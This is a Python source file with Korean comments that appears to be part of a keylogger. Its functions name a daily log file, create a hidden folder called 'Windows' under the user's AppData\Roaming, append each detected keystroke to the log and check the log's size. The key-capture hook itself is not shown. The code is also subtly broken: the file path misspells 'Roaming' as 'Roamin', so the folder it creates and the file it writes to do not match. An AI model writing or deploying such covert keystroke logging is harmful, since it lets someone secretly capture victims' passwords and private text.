import os
import getpass
from datetime import datetime

username = getpass.getuser()

# 로그 파일의 이름을 가져오는 함수 (ex > 2021-01-26.log)
def getlofilename():
    now = datetime.now()
    now = str(now).split()[0]
    filename = now + '.log'
    return filename

#로그 파일의 경로를 가져오는 함수
def getlogfilepath(filename):
    dirpath = os.path.join("C:\\Users", username, "AppData\\Roaming\\Windows")
    if not(os.path.isdir(dirpath)):
        os.makedirs(os.path.join(dirpath))
    filepath = os.path.join("C:\\Users", username, "AppData\\Roamin\\Windows", filename)
    return filepath

#감지한 키를 로깅하는 함수
def logger(key):
    key = str(key).replace("'", '')
    f = open(getlogfilepath(getlofilename()), mode = 'at', encoding= "utf-8")
    f.write(key)
    f.close()

def getfilesize():
    filesize = os.path.getsize(getlogfilepath(getlofilename()))
    return filesize